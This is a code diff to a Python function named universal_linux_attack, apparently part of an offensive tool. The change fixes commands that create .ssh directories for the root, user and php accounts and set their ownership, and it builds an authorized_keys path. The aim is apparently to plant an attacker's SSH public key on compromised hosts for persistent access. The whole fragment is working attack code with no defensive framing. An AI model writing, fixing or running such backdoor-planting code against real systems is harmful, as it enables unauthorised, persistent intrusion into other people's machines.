@@ -99,11 +99,16 @@ def universal_linux_attack(host):
         username : "/home/{}".format(username),
         "php" : "/home/php"
     }
+    user_group = {
+        "root" : "root",
+        username : username,
+        "php" : "root"
+    }
     ssh_pub_key = get_ssh_pub()
     ssh.prompt()
     for user, directory in user_directories.items():
-        sshdir_make_cmd = "mkdir -p \'{}\'".format(directory)
-        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{0} {1}".format(user, directory)
+        sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
+        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
         
         authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)
 
